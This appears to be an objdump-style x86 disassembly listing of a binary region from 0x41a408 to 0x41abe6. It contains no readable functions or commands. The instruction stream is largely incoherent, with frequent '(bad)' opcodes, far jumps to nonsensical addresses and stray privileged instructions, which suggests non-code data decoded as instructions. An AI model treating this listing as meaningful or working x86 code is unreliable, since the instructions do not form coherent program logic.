  41a408:	and    dh,BYTE PTR [ecx]
  41a40a:	add    dl,dl
  41a40c:	mov    esp,0x429495df
  41a411:	inc    edi
  41a412:	cmp    eax,0x2dd2b6bf
  41a417:	jnp    0xe4099e9a
  41a41d:	mov    ebx,0xc5bf293c
  41a422:	adc    DWORD PTR [edx],ebx
  41a424:	or     al,0x7c
  41a426:	and    BYTE PTR [ebx-0x5c],ah
  41a429:	jb     0x41a480
  41a42b:	shl    BYTE PTR [esp+ebp*8],1
  41a42e:	inc    edx
  41a42f:	mul    ecx
  41a431:	sti    
  41a432:	push   ds
  41a433:	push   0x10
  41a435:	add    ch,BYTE PTR [edx]
  41a437:	cmp    eax,0x6d863d84
  41a43c:	mov    ch,0x85
  41a43e:	imul   edx,eax,0xdea1f23d
  41a444:	jnp    0x41a42f
  41a446:	loop   0x41a417
  41a448:	daa    
  41a449:	sbb    DWORD PTR [edx],esi
  41a44b:	push   0x12
  41a44d:	cwde   
  41a44e:	dec    eax
  41a44f:	push   cs
  41a450:	pop    es
  41a451:	cmp    BYTE PTR [eax+ecx*2],ch
  41a454:	jo     0x41a41d
  41a456:	adc    eax,0x9a125584
  41a45b:	int    0xae
  41a45d:	fisub  DWORD PTR [edx]
  41a45f:	leave  
  41a460:	fwait
  41a461:	or     DWORD PTR [ebp-0x573516bd],esi
  41a467:	int3   
  41a468:	or     BYTE PTR [esi+0x68],ch
  41a46b:	enter  0x947b,0x95
  41a46f:	cmp    al,0xf0
  41a471:	jae    0x41a3fc
  41a473:	sbb    bh,cl
  41a475:	popf   
  41a476:	xor    eax,0xfba5f358
  41a47b:	inc    ebp
  41a47c:	clc    
  41a47d:	in     eax,dx
  41a47e:	cwde   
  41a47f:	in     eax,dx
  41a480:	jp     0x41a435
  41a482:	jl     0x41a422
  41a484:	loopne 0x41a4f8
  41a486:	lods   eax,DWORD PTR ds:[esi]
  41a487:	sbb    al,0xc0
  41a489:	ins    BYTE PTR es:[edi],dx
  41a48a:	jno    0x41a4ec
  41a48c:	dec    ebp
  41a48d:	add    dl,BYTE PTR [ecx+0x34b042d8]
  41a493:	mov    ch,0xf5
  41a495:	imul   ebp,DWORD PTR ds:0x6f,0x0
	...
  41a514:	pop    esi
  41a515:	mov    DWORD PTR ds:0x7feed766,eax
  41a51b:	mov    ecx,0x4f6277d8
  41a520:	jmp    0x41a597
  41a522:	mov    eax,ds:0x144d5ce
  41a527:	add    BYTE PTR [edi+eax*1+0x0],ch
  41a52b:	add    BYTE PTR [eax+0x29],ch
  41a52e:	je     0x41a5a1
  41a530:	inc    ecx
  41a531:	mov    ah,BYTE PTR [esi]
  41a533:	and    BYTE PTR [ecx-0x710fda94],ah
  41a539:	fistp  DWORD PTR [ecx-0x5bf435f4]
  41a53f:	push   edi
  41a540:	jno    0x41a54b
  41a542:	inc    edi
  41a543:	retf   0x3b33
  41a546:	bound  edi,QWORD PTR [ebx+0x2f]
  41a549:	jl     0x41a51d
  41a54b:	mov    ebp,0xe8bd1b14
  41a550:	mov    dh,0x3e
  41a552:	nop
  41a553:	xor    al,0x9f
  41a555:	jno    0x41a516
  41a557:	dec    ecx
  41a558:	sahf   
  41a559:	adc    bl,dl
  41a55b:	push   ebp
  41a55c:	cdq    
  41a55d:	and    al,0x37
  41a55f:	jno    0x41a598
  41a561:	xchg   ebp,eax
  41a562:	xor    DWORD PTR [eax],ecx
  41a564:	les    ecx,FWORD PTR [eax]
  41a566:	fcmove st,st(2)
  41a568:	mov    ebx,0xd1ad493d
  41a56d:	retf   
  41a56e:	cwde   
  41a56f:	gs lahf 
  41a571:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a572:	ficomp WORD PTR [esi-0x1c4466]
  41a578:	push   esp
  41a579:	add    ch,BYTE PTR [ebp+0x502efda4]
  41a57f:	loop   0x41a5b7
  41a581:	push   DWORD PTR [ebp-0x5b]
  41a584:	loope  0x41a556
  41a586:	sbb    BYTE PTR [ebp-0x27],bh
  41a589:	fwait
  41a58a:	and    al,0xfc
  41a58c:	mov    DWORD PTR [eax+0x6f],0xc085cf39
  41a593:	stc    
  41a594:	or     bl,bh
  41a596:	out    0x77,al
  41a598:	or     BYTE PTR [esi+0xb01b047],ch
  41a59e:	jge    0x41a591
  41a5a0:	xor    ah,dl
  41a5a2:	xchg   ecx,eax
  41a5a3:	stos   BYTE PTR es:[edi],al
  41a5a4:	jb     0x41a5fe
  41a5a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5a7:	and    eax,0x373f18f3
  41a5ac:	sbb    BYTE PTR [ebx+eax*4],dl
  41a5af:	xor    bh,BYTE PTR [ebp-0x3c]
  41a5b2:	xor    eax,DWORD PTR [ebx+0x2c]
  41a5b5:	push   0xdf8725bd
  41a5ba:	shl    BYTE PTR [edi],0x6c
  41a5bd:	ja     0x41a59f
  41a5bf:	mov    BYTE PTR [edx+0x73],dl
  41a5c2:	xchg   edx,eax
  41a5c3:	push   ds
  41a5c4:	sbb    al,0x6b
  41a5c6:	adc    DWORD PTR [esi-0x2a8b8fa9],ecx
  41a5cc:	mov    ebp,0xd8808c76
  41a5d1:	pop    ebx
  41a5d2:	dec    edx
  41a5d3:	xchg   esp,eax
  41a5d4:	add    eax,0x797c076d
  41a5d9:	sysexit 
  41a5db:	xor    eax,0x1563fbd4
  41a5e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5e1:	les    ebp,FWORD PTR [esi]
  41a5e3:	mov    eax,DWORD PTR [esi]
  41a5e5:	es push edi
  41a5e7:	fild   WORD PTR [edx+0x2a]
  41a5ea:	(bad)  
  41a5eb:	cld    
  41a5ec:	inc    ebp
  41a5ed:	in     eax,0x87
  41a5ef:	ins    DWORD PTR es:[edi],dx
  41a5f0:	lock and BYTE PTR [edx],0x4e
  41a5f4:	adc    DWORD PTR [ecx-0x7d],esp
  41a5f7:	es loope 0x41a5d1
  41a5fa:	int3   
  41a5fb:	inc    esp
  41a5fc:	inc    ecx
  41a5fd:	cmc    
  41a5fe:	mov    al,ds:0xe64adf84
  41a603:	fs and al,0x2c
  41a606:	xchg   edi,eax
  41a607:	cmp    bl,BYTE PTR [edi-0x74]
  41a60a:	adc    DWORD PTR [edx-0x4a680d40],esp
  41a610:	aam    0x0
  41a612:	sti    
  41a613:	lock or al,0xfd
  41a616:	sub    eax,0x585a9f03
  41a61b:	scas   eax,DWORD PTR es:[edi]
  41a61c:	ins    BYTE PTR es:[edi],dx
  41a61d:	push   ss
  41a61e:	out    dx,eax
  41a61f:	(bad)  
  41a620:	inc    eax
  41a621:	fwait
  41a622:	je     0x41a69d
  41a624:	les    esi,FWORD PTR [eax]
  41a626:	adc    al,0x34
  41a628:	xchg   esp,eax
  41a629:	push   0xa756191e
  41a62e:	mov    ds:0x8f7055f9,al
  41a633:	sbb    DWORD PTR ds:0xb7a2635e,esp
  41a639:	pop    edx
  41a63a:	stc    
  41a63b:	out    dx,al
  41a63c:	in     eax,dx
  41a63d:	dec    ebx
  41a63e:	push   eax
  41a63f:	in     al,dx
  41a640:	repz sbb DWORD PTR [esi+0x1d],edx
  41a644:	call   0x1da9:0xef35a8a5
  41a64b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a64c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a64d:	inc    ecx
  41a64e:	aas    
  41a64f:	arpl   WORD PTR [eax],bp
  41a651:	mov    bh,0x63
  41a653:	(bad)  
  41a654:	sbb    eax,DWORD PTR [edi-0x4a14330f]
  41a65a:	pop    edi
  41a65b:	test   DWORD PTR [edi],esi
  41a65d:	sub    ebp,eax
  41a65f:	or     bl,dh
  41a661:	ds xchg esi,eax
  41a663:	or     eax,0xff04c663
  41a668:	mov    ds:0x9331ab0d,eax
  41a66d:	xor    dh,BYTE PTR [ebx+edi*4-0x16]
  41a671:	shl    DWORD PTR [edi-0x1f8a8673],1
  41a677:	inc    ebx
  41a678:	call   0x828c:0xef0c1288
  41a67f:	fbstp  TBYTE PTR [edi]
  41a681:	cmc    
  41a682:	out    dx,al
  41a683:	push   edi
  41a684:	push   es
  41a685:	jp     0x41a6ae
  41a687:	pop    ebp
  41a688:	pop    ebx
  41a689:	jl     0x41a6a9
  41a68b:	leave  
  41a68c:	xchg   DWORD PTR [eax-0x99d2382],ebx
  41a692:	test   DWORD PTR [edi+0x40a8934e],esp
  41a698:	add    DWORD PTR [eax],0x609119d4
  41a69e:	xchg   edi,eax
  41a69f:	jno    0x41a688
  41a6a1:	lods   eax,DWORD PTR ds:[esi]
  41a6a2:	(bad)
  41a6a5:	inc    ecx
  41a6a6:	loope  0x41a6cc
  41a6a8:	mov    dl,dh
  41a6aa:	std    
  41a6ab:	imul   edi,DWORD PTR [edi],0x80ed23ec
  41a6b1:	inc    ebx
  41a6b2:	sbb    eax,0x4895f108
  41a6b7:	mov    cl,0xbc
  41a6b9:	inc    esp
  41a6ba:	inc    ecx
  41a6bb:	fwait
  41a6bc:	xchg   ebp,eax
  41a6bd:	outs   dx,BYTE PTR ds:[esi]
  41a6be:	mov    cl,cl
  41a6c0:	cmp    edi,ecx
  41a6c2:	push   ecx
  41a6c3:	mov    ebp,0x5b423487
  41a6c8:	push   es
  41a6c9:	imul   ecx,edi,0x3
  41a6cc:	lds    ecx,FWORD PTR [ebp-0x3ffba334]
  41a6d2:	and    eax,0x853019aa
  41a6d7:	in     al,dx
  41a6d8:	imul   esi,eax,0x4a
  41a6db:	cdq    
  41a6dc:	inc    eax
  41a6dd:	cmc    
  41a6de:	jmp    0xe84c953d
  41a6e3:	xchg   ebp,eax
  41a6e4:	xchg   DWORD PTR [eax+0x2f9abfb2],ebx
  41a6ea:	imul   ebp,DWORD PTR [esi-0xdcce897],0x1eface7e
  41a6f4:	xchg   ebx,eax
  41a6f5:	inc    eax
  41a6f6:	adc    BYTE PTR [eax-0x5b],bh
  41a6f9:	aas    
  41a6fa:	inc    edx
  41a6fb:	inc    sp
  41a6fd:	jmp    0x41a713
  41a6ff:	ret    
  41a700:	ds gs sub edi,ebx
  41a704:	sbb    al,0xab
  41a706:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a707:	or     DWORD PTR [edi-0x4b],ebx
  41a70a:	daa    
  41a70b:	ficom  DWORD PTR [ebp-0x26]
  41a70e:	daa    
  41a70f:	adc    eax,0x86656c38
  41a714:	jp     0x41a714
  41a716:	jecxz  0x41a78e
  41a718:	push   cs
  41a719:	mov    ?,WORD PTR [edi+0x3a17b2e5]
  41a71f:	inc    eax
  41a720:	inc    esi
  41a721:	xchg   DWORD PTR [esi-0x34],esp
  41a724:	jp     0x41a6fa
  41a726:	sub    ebx,DWORD PTR cs:[ebx-0x79]
  41a72a:	pushf  
  41a72b:	mov    al,ds:0x8726166d
  41a730:	dec    eax
  41a731:	xchg   BYTE PTR [edx],cl
  41a733:	or     ecx,ebp
  41a735:	lea    ebx,[edx-0x25]
  41a738:	test   cl,bh
  41a73a:	aam    0xba
  41a73c:	repz push ds
  41a73e:	adc    al,0xe2
  41a740:	or     al,0x3d
  41a742:	fisub  WORD PTR [ebx+0x65d9df9d]
  41a748:	xchg   ebp,eax
  41a749:	or     BYTE PTR [ebx+esi*2-0xa],0xc2
  41a74e:	aam    0x4c
  41a750:	ficomp WORD PTR [esi+edx*8+0x15]
  41a754:	sbb    DWORD PTR [ebp-0x7760c4ac],ebp
  41a75a:	jmp    0x41a6fd
  41a75c:	or     eax,0x5b26b70c
  41a761:	jmp    0x41a748
  41a763:	push   ds
  41a764:	inc    ebx
  41a765:	mov    cl,0xb5
  41a767:	xchg   edx,eax
  41a768:	mov    dh,0xcc
  41a76a:	mov    BYTE PTR [edi+ecx*8-0x4e],ah
  41a76e:	iret   
  41a76f:	push   edx
  41a770:	and    edx,DWORD PTR [edx]
  41a772:	inc    ecx
  41a773:	cli    
  41a774:	std    
  41a775:	(bad)  
  41a776:	xchg   ebp,eax
  41a777:	mov    edi,0xec3219a8
  41a77c:	mov    ds,esp
  41a77e:	fild   DWORD PTR [edx+0x557a2d5e]
  41a784:	mov    al,0xf9
  41a786:	ds rcr esi,1
  41a789:	lock mov edi,0x1c5a9096
  41a78f:	test   al,0x6d
  41a791:	jnp    0x41a805
  41a793:	sbb    bl,bl
  41a795:	sti    
  41a796:	jns    0x41a741
  41a798:	add    dh,dh
  41a79a:	loop   0x41a741
  41a79c:	mov    WORD PTR [esi-0x23],es
  41a79f:	sbb    BYTE PTR ds:0x8a338fb6,dl
  41a7a5:	clc    
  41a7a6:	mov    WORD PTR [ebx],fs
  41a7a8:	xchg   edx,eax
  41a7a9:	sahf   
  41a7aa:	jbe    0x41a7c8
  41a7ac:	stos   DWORD PTR es:[edi],eax
  41a7ad:	iret   
  41a7ae:	pop    ss
  41a7af:	fs jl  0x41a7bc
  41a7b2:	test   BYTE PTR [edx+0x54],bl
  41a7b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7b6:	les    ecx,FWORD PTR [eax+0x34]
  41a7b9:	add    DWORD PTR [ecx+0x5e],esp
  41a7bc:	and    bl,BYTE PTR [ecx]
  41a7be:	adc    al,0x7e
  41a7c0:	es jp  0x41a74f
  41a7c3:	retf   0xc574
  41a7c6:	and    eax,0x3350e045
  41a7cb:	and    BYTE PTR [esi+0x67e84d87],ah
  41a7d1:	sbb    BYTE PTR [ecx+ebx*8+0x49],ch
  41a7d5:	cdq    
  41a7d6:	sbb    DWORD PTR [edi-0x668f17a3],0xbfb24ac7
  41a7e0:	cmp    eax,0x3b094dfc
  41a7e5:	icebp  
  41a7e6:	add    ecx,ecx
  41a7e8:	adc    BYTE PTR [edx-0xcaf483d],dl
  41a7ee:	sbb    esi,ebp
  41a7f0:	sub    eax,0x3ba88057
  41a7f5:	ficomp DWORD PTR [ebx-0x53bc8ad9]
  41a7fb:	mov    cl,0x39
  41a7fd:	stos   DWORD PTR es:[edi],eax
  41a7fe:	dec    esi
  41a7ff:	sbb    bl,BYTE PTR [esp+0x57c5a819]
  41a806:	push   edi
  41a807:	fs pusha 
  41a809:	sub    BYTE PTR [eax+0x20],dl
  41a80c:	add    bl,al
  41a80e:	cli    
  41a80f:	push   0xffffffbf
  41a811:	addr16 adc al,cl
  41a814:	out    dx,al
  41a815:	or     eax,0xa4e88019
  41a81a:	mov    ah,BYTE PTR [esi+0x4d]
  41a81d:	addr16 mov bh,0xd3
  41a820:	data16 jae 0x41a84a
  41a823:	fcmovu st,st(6)
  41a825:	ret    0xf865
  41a828:	jmp    0x4f344228
  41a82d:	retf   0xee3f
  41a830:	fstp   QWORD PTR [eax+0x77ad41b6]
  41a836:	pop    eax
  41a837:	sti    
  41a838:	xor    cl,BYTE PTR [ebx+0x748d27ce]
  41a83e:	loop   0x41a84a
  41a840:	loope  0x41a7d0
  41a842:	and    dl,ah
  41a844:	lahf   
  41a845:	nop
  41a846:	xor    eax,0x26877682
  41a84b:	mov    edx,0x20355418
  41a850:	xor    al,0x19
  41a852:	sub    al,0x3d
  41a854:	stc    
  41a855:	pop    esp
  41a856:	(bad)  
  41a857:	(bad)  
  41a858:	and    BYTE PTR ds:0xc88c1033,bh
  41a85e:	fmul   QWORD PTR [edi]
  41a860:	fmul   DWORD PTR [eax-0x15]
  41a863:	ja     0x41a8d5
  41a865:	in     eax,0xf9
  41a867:	(bad)  
  41a868:	fcos   
  41a86a:	pop    ss
  41a86b:	arpl   WORD PTR [edx+0x6c],si
  41a86e:	out    dx,al
  41a86f:	(bad)  
  41a870:	jecxz  0x41a853
  41a872:	in     al,dx
  41a873:	dec    eax
  41a874:	push   ecx
  41a875:	loopne 0x41a8b9
  41a877:	inc    ebx
  41a878:	xor    al,0x41
  41a87a:	pop    ecx
  41a87b:	std    
  41a87c:	pop    edi
  41a87d:	mov    ch,0xed
  41a87f:	xor    DWORD PTR [ecx],0x79d7ed63
  41a885:	mov    bl,ch
  41a887:	test   al,0x52
  41a889:	jnp    0x41a8de
  41a88b:	lods   eax,DWORD PTR ds:[esi]
  41a88c:	fst    QWORD PTR [esp+ebx*8-0x79730316]
  41a893:	es xor bl,dh
  41a896:	dec    ecx
  41a897:	adc    al,BYTE PTR [ecx+0x494cd651]
  41a89d:	sub    eax,0xb8a78bfa
  41a8a2:	lods   eax,DWORD PTR ds:[esi]
  41a8a3:	mov    dh,0x4e
  41a8a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8a6:	and    al,0x5b
  41a8a8:	jmp    0x5d550f5a
  41a8ad:	cdq    
  41a8ae:	pop    ecx
  41a8af:	adc    BYTE PTR [esi-0x1a],dh
  41a8b2:	icebp  
  41a8b3:	jae    0x41a933
  41a8b5:	push   cs
  41a8b6:	push   es
  41a8b7:	clc    
  41a8b8:	test   BYTE PTR [edx-0x15d9bf86],ah
  41a8be:	mov    dl,0x4a
  41a8c0:	fadd   QWORD PTR [edi+edi*1-0x71f175be]
  41a8c7:	daa    
  41a8c8:	hlt    
  41a8c9:	fcomi  st,st(3)
  41a8cb:	dec    esi
  41a8cc:	in     eax,0xf8
  41a8ce:	je     0x41a8ef
  41a8d0:	adc    al,BYTE PTR [ebp+0x29]
  41a8d3:	test   eax,0x2041485f
  41a8d8:	fwait
  41a8d9:	ja     0x41a89d
  41a8db:	push   cs
  41a8dc:	mov    edi,0xb6f4fbb7
  41a8e1:	or     ecx,0xffffff99
  41a8e4:	pop    ebx
  41a8e5:	xchg   ecx,eax
  41a8e6:	stos   DWORD PTR es:[edi],eax
  41a8e7:	ret    0xe4e8
  41a8ea:	loop   0x41a8ac
  41a8ec:	jb     0x41a920
  41a8ee:	adc    DWORD PTR [edi-0x4aef7954],ecx
  41a8f4:	icebp  
  41a8f5:	pop    ebx
  41a8f6:	ret    0x4d1f
  41a8f9:	popf   
  41a8fa:	loope  0x41a94d
  41a8fc:	lds    esp,FWORD PTR [edi]
  41a8fe:	stc    
  41a8ff:	or     DWORD PTR [esi+0x4cce399],ebx
  41a905:	dec    esp
  41a906:	xor    al,0x3e
  41a908:	cmp    eax,0x3a2c26f1
  41a90d:	arpl   dx,cx
  41a90f:	je     0x41a925
  41a911:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a912:	dec    ecx
  41a913:	icebp  
  41a914:	pusha  
  41a915:	cmp    ebp,DWORD PTR [esp+ebp*1+0x4843e086]
  41a91c:	call   0x6865:0xb8cc854e
  41a923:	inc    edx
  41a924:	rcl    DWORD PTR [edi-0x4a531446],cl
  41a92a:	daa    
  41a92b:	stos   DWORD PTR es:[edi],eax
  41a92c:	nop
  41a92d:	jl     0x41a924
  41a92f:	mov    dl,0xd2
  41a931:	mov    ah,0x60
  41a933:	in     eax,dx
  41a934:	cmc    
  41a935:	stos   DWORD PTR es:[edi],eax
  41a936:	call   0xe2b5:0xa15413f6
  41a93d:	cmp    DWORD PTR [esi+eiz*8+0x7cd8e90f],eax
  41a944:	int3   
  41a945:	outs   dx,BYTE PTR ds:[esi]
  41a946:	cmp    al,0xd3
  41a948:	sbb    bh,BYTE PTR [ebx-0x298d05d8]
  41a94e:	sub    BYTE PTR [edx-0x5],dl
  41a951:	cs test al,0x1c
  41a954:	call   0x92adaac7
  41a959:	jecxz  0x41a8f6
  41a95b:	add    dl,ch
  41a95d:	mov    BYTE PTR [ebp-0x9f67ac6],ch
  41a963:	adc    al,0x37
  41a965:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a966:	test   eax,0xb35a01fa
  41a96b:	lods   eax,DWORD PTR ds:[esi]
  41a96c:	push   eax
  41a96d:	xor    al,0xeb
  41a96f:	cmp    bh,0x49
  41a972:	xor    DWORD PTR [edx+eax*4],ebp
  41a975:	xchg   edx,eax
  41a976:	jp     0x41a98c
  41a978:	cmp    bl,BYTE PTR [ecx+0x73]
  41a97b:	xor    BYTE PTR [eax-0x3d],al
  41a97e:	sbb    eax,0x16374b5e
  41a983:	retf   0xc7aa
  41a986:	mov    DWORD PTR [ebp-0x24126aeb],edx
  41a98c:	outs   dx,BYTE PTR ds:[esi]
  41a98d:	pop    ss
  41a98e:	in     al,0xa9
  41a990:	js     0x41a9e7
  41a992:	loope  0x41a91f
  41a994:	pop    ss
  41a995:	add    eax,0xabe1de03
  41a99a:	fsub   DWORD PTR [ebp+0x4e]
  41a99d:	ret    0x54b1
  41a9a0:	jp     0x41a983
  41a9a2:	inc    esi
  41a9a3:	or     al,0x55
  41a9a5:	inc    esp
  41a9a6:	jmp    0x41aa04
  41a9a8:	xor    eax,DWORD PTR [ebx-0x3207e1ac]
  41a9ae:	rcr    cl,0x1b
  41a9b1:	xchg   ebx,eax
  41a9b2:	(bad)  [esi]
  41a9b4:	mul    BYTE PTR [ecx-0x1d0146bf]
  41a9ba:	push   es
  41a9bb:	xchg   ebx,eax
  41a9bc:	(bad)  
  41a9bd:	(bad)  
  41a9be:	(bad)  
  41a9c0:	lods   al,BYTE PTR ds:[esi]
  41a9c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9c2:	test   eax,0x940e1586
  41a9c7:	pop    ecx
  41a9c8:	xor    DWORD PTR [ecx+0x59],edi
  41a9cb:	lock pop ebx
  41a9cd:	mov    eax,0xf88672b4
  41a9d2:	shr    DWORD PTR [ecx-0x47],1
  41a9d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9d6:	les    esp,FWORD PTR [esi-0x956c12]
  41a9dc:	test   esp,ebp
  41a9de:	sbb    eax,eax
  41a9e0:	mov    bh,0x63
  41a9e2:	enter  0x80cd,0xd5
  41a9e6:	push   es
  41a9e7:	lea    ebp,[edi+0x62]
  41a9ea:	dec    ecx
  41a9eb:	dec    eax
  41a9ec:	fbld   TBYTE PTR [esi]
  41a9ee:	cmp    edi,DWORD PTR [eax+0x14]
  41a9f1:	loop   0x41a9fd
  41a9f3:	jmp    0x5081:0x3da15d67
  41a9fa:	ins    BYTE PTR es:[edi],dx
  41a9fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9fc:	mov    ebp,0x209d9077
  41aa01:	or     al,0xe
  41aa03:	xchg   esp,eax
  41aa04:	add    al,0x53
  41aa06:	push   0x23d4a1db
  41aa0b:	inc    esp
  41aa0c:	call   0xa359:0x8c23846
  41aa13:	icebp  
  41aa14:	jmp    0x41aa1d
  41aa16:	pop    ecx
  41aa17:	sub    BYTE PTR [ecx+0x14],al
  41aa1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa1b:	and    DWORD PTR [edx+0x60],eax
  41aa1e:	inc    ecx
  41aa1f:	ror    DWORD PTR [eax],1
  41aa21:	int    0x61
  41aa23:	test   al,0x48
  41aa25:	jne    0x41a9ef
  41aa27:	add    eax,0x8d5ecd64
  41aa2c:	loope  0x41aa18
  41aa2e:	outs   dx,DWORD PTR ds:[esi]
  41aa2f:	jnp    0x41aa01
  41aa31:	sbb    bl,BYTE PTR [edi]
  41aa33:	mov    edx,0x85bfbb0b
  41aa38:	mov    cl,0xc7
  41aa3a:	mov    ebp,0x4768ad42
  41aa3f:	lds    ecx,FWORD PTR [edi+ebp*4+0x3c90b05]
  41aa46:	mov    al,0x10
  41aa48:	add    al,0x38
  41aa4a:	bound  ebx,QWORD PTR [ecx-0x306e9760]
  41aa50:	cmp    bh,ah
  41aa52:	fnsave ds:0xce8c7989
  41aa58:	cs xor eax,0x79088c11
  41aa5e:	pop    ecx
  41aa5f:	xor    al,0xb2
  41aa61:	push   ecx
  41aa62:	loopne 0x41aabd
  41aa64:	sbb    al,0x44
  41aa66:	fwait
  41aa67:	mov    ds:0xf9c77c27,al
  41aa6c:	ja     0x41aa3f
  41aa6e:	add    esi,DWORD PTR [edx-0x1]
  41aa71:	jg     0x41aa77
  41aa73:	jp     0x41aac3
  41aa75:	push   ds
  41aa76:	push   edi
  41aa77:	mov    dh,0x8
  41aa79:	jns    0x41aaad
  41aa7b:	sbb    ebp,DWORD PTR [esp+edi*1]
  41aa7e:	sub    eax,0x75afd1b2
  41aa83:	sbb    DWORD PTR [edx+0x1e],edi
  41aa86:	sub    BYTE PTR [esi-0x397296a5],bl
  41aa8c:	mov    eax,ds:0x8df67bd0
  41aa91:	push   esi
  41aa92:	scas   al,BYTE PTR es:[edi]
  41aa93:	push   es
  41aa94:	xor    eax,0xb135936f
  41aa99:	cmp    eax,0xc505e028
  41aa9e:	mov    ds:0x94b664eb,eax
  41aaa3:	add    esp,DWORD PTR [esi-0x7b]
  41aaa6:	scas   eax,DWORD PTR es:[edi]
  41aaa7:	inc    eax
  41aaa8:	loop   0x41aac5
  41aaaa:	pop    ss
  41aaab:	xchg   esp,eax
  41aaac:	jne    0x41aa5e
  41aaae:	shl    DWORD PTR [edx],0xcf
  41aab1:	loope  0x41aacf
  41aab3:	mov    al,0xa5
  41aab5:	cmc    
  41aab6:	mov    WORD PTR [eax-0x58],gs
  41aab9:	or     eax,0x195b2c4d
  41aabe:	or     bh,ah
  41aac0:	inc    ebp
  41aac1:	xchg   DWORD PTR [edi],ebx
  41aac3:	fld    TBYTE PTR [ecx]
  41aac5:	xlat   BYTE PTR ds:[ebx]
  41aac6:	enter  0xe5c,0xf3
  41aaca:	(bad)  
  41aacb:	mov    ds:0x3fbec8e7,al
  41aad0:	adc    al,0x67
  41aad2:	cwde   
  41aad3:	test   DWORD PTR [esi],ecx
  41aad5:	retf   
  41aad6:	or     BYTE PTR [ebp+0x55561db6],dl
  41aadc:	shr    BYTE PTR [eax],0x35
  41aadf:	mov    ds:0x62ec67c1,eax
  41aae4:	xchg   ebx,eax
  41aae5:	jp     0x41aad6
  41aae7:	push   bp
  41aae9:	mov    ch,0x36
  41aaeb:	test   al,0x51
  41aaed:	pavgb  mm7,QWORD PTR [esi]
  41aaf0:	mov    eax,0x9b14ff35
  41aaf5:	add    al,BYTE PTR [esi]
  41aaf7:	jo     0x41aab9
  41aaf9:	fistp  QWORD PTR [ecx-0x2a]
  41aafc:	loop   0x41aab5
  41aafe:	enter  0x21f6,0x5
  41ab02:	stos   BYTE PTR es:[edi],al
  41ab03:	imul   cl
  41ab05:	jnp    0x41aadd
  41ab07:	add    al,0x71
  41ab09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab0a:	mov    ds:0x582d650f,al
  41ab0f:	test   BYTE PTR [edi-0x43],bl
  41ab12:	pop    eax
  41ab13:	out    0x2e,eax
  41ab15:	std    
  41ab16:	fldcw  WORD PTR [ebx]
  41ab18:	iret   
  41ab19:	pop    edi
  41ab1a:	sbb    al,0x28
  41ab1c:	out    0x7c,eax
  41ab1e:	inc    ecx
  41ab1f:	mov    esi,0xf822e589
  41ab24:	outs   dx,BYTE PTR ds:[esi]
  41ab25:	lea    edi,[ecx-0x51]
  41ab28:	data16 loope 0x41ab95
  41ab2b:	pop    esp
  41ab2c:	outs   dx,DWORD PTR ds:[esi]
  41ab2d:	pusha  
  41ab2e:	mov    ah,0x14
  41ab30:	dec    esi
  41ab31:	and    ecx,0xc70cc7ef
  41ab37:	leave  
  41ab38:	loopne 0x41ab83
  41ab3a:	outs   dx,DWORD PTR ds:[esi]
  41ab3b:	sub    DWORD PTR [ebx+0x10],esp
  41ab3e:	clc    
  41ab3f:	or     eax,0x346a1fdd
  41ab44:	out    0xab,al
  41ab46:	ss pusha 
  41ab48:	adc    DWORD PTR [ebx+0xe6a4c66],esi
  41ab4e:	cmp    eax,0x8f98458a
  41ab53:	test   BYTE PTR gs:[ebx+0x79e6f749],bh
  41ab5a:	sub    esi,ebx
  41ab5c:	jns    0x41abce
  41ab5e:	ffree  st(2)
  41ab60:	jno    0x41abbb
  41ab62:	xor    DWORD PTR [edi+0x42072155],ecx
  41ab68:	sub    eax,0xcb4e04d4
  41ab6d:	sbb    BYTE PTR [edi+0x63f75b6a],ch
  41ab73:	sub    edx,DWORD PTR [ecx+0x56eb79ac]
  41ab79:	les    ecx,FWORD PTR [edx-0x48]
  41ab7c:	push   edi
  41ab7d:	xchg   ecx,eax
  41ab7e:	xchg   ecx,eax
  41ab7f:	push   0x2b
  41ab81:	jmp    0x959104d4
  41ab86:	(bad)  
  41ab87:	in     al,dx
  41ab88:	mov    cs,WORD PTR [esi-0x70]
  41ab8b:	daa    
  41ab8c:	jnp    0x41abf9
  41ab8e:	mov    esp,0x2d44d636
  41ab93:	mov    ?,edi
  41ab95:	jle    0x41abf6
  41ab97:	aaa    
  41ab98:	aad    0x51
  41ab9a:	stos   BYTE PTR es:[edi],al
  41ab9b:	push   esp
  41ab9c:	add    ch,BYTE PTR [ebx]
  41ab9e:	sub    al,0xbc
  41aba0:	and    edi,DWORD PTR [esi-0x61eb5c90]
  41aba6:	jmp    0x890bf76c
  41abab:	pop    ebx
  41abac:	fnstsw WORD PTR [esi-0x54]
  41abaf:	sub    DWORD PTR [edi-0x78],0xffffffe9
  41abb3:	lock sub ch,bh
  41abb6:	mov    edx,0x4e558393
  41abbb:	ret    
  41abbc:	dec    ebp
  41abbd:	mov    al,ds:0xca84d52b
  41abc2:	and    ecx,0xffffffe2
  41abc5:	retf   0x591e
  41abc8:	jnp    0x41abb0
  41abca:	and    BYTE PTR [edx],cl
  41abcc:	push   eax
  41abcd:	div    DWORD PTR [ebx+0x1a9ece91]
  41abd3:	(bad)  
  41abd4:	fwait
  41abd5:	repnz mov al,0x77
  41abd8:	cwde   
  41abd9:	push   ss
  41abda:	pop    ebp
  41abdb:	dec    eax
  41abdc:	lods   eax,DWORD PTR ds:[esi]
  41abdd:	inc    ecx
  41abde:	push   edx
  41abdf:	punpckhdq mm7,QWORD PTR [ebx]
  41abe2:	jne    0x41ac0f
  41abe4:	pop    es
  41abe5:	push   ebp
  41abe6:	sar    BYTE PTR [ebp*4+0x1119fec3],cl
